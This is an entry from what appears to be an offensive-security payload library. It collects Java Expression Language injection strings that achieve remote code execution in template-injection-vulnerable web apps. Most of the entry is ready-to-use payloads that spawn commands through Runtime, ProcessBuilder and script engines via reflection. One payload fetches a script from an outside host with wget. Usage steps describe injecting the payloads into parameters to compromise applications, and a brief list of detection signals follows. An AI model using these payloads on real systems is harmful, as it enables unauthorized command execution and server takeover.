---
id: 444c7691-ddb4-43af-be51-162cf3aaccbe
type: code
language: Java
verified: true
created_at: '2023-04-06T03:56:39.010636+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - ssti
  - el
  - rce
  - java
  - payload
platforms:
  - Web
  - Java
validated: true
---

# Java-Expression-Language-RCE-Payloads

## Code

```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using process builder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\"ping x.x.x.x\")")}

// Method using JavaClass
T(java.lang.Runtime).getRuntime().exec('whoami').x

// Method using ScriptEngineManager
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder;x.command(\"wget\",\"http://x.x.x.x/1.sh\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())"))}
```

## Description

This code collection provides multiple Expression Language (EL)-compatible payloads for achieving remote code execution (RCE) in Java web applications vulnerable to Server-Side Template Injection (SSTI). Each payload uses Java's reflection to instantiate classes like Runtime or ProcessBuilder, allowing arbitrary command execution during EL evaluation. These are designed for injection into vulnerable parameters in JSP or EL-enabled templates.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <COMMAND STRING/ARRAY> | The command or array of commands to execute (e.g., 'whoami' or ['ping', 'attacker_ip']) | 'whoami' |
| <COMMAND ARRAY/LIST> | Array or list of command arguments for ProcessBuilder | ['cmd.exe', '/c', 'dir'] |
| x.x.x.x | IP address or hostname for network-based commands (e.g., ping or wget) | 192.168.1.100 |

## Usage

Inject these payloads into EL-evaluated inputs (e.g., URL parameters like ?q=${payload}). Start with simple tests like ${7*7} to confirm SSTI, then escalate to RCE. For multi-statement payloads, submit them sequentially if the application supports session persistence. Used in procedures like [[procedures/Exploit-SSTI-with-Expression-Language-for-Java-RCE]] for web app compromise.

## Detection

- WAF rules matching EL patterns like ${...} or #{...} followed by java.lang.Runtime.
- Application logs showing unexpected Runtime.exec or ProcessBuilder.start calls.
- Network anomalies like outbound pings or file downloads to attacker IPs.
- Runtime monitoring for reflection abuse (e.g., via Java agents or RASP).
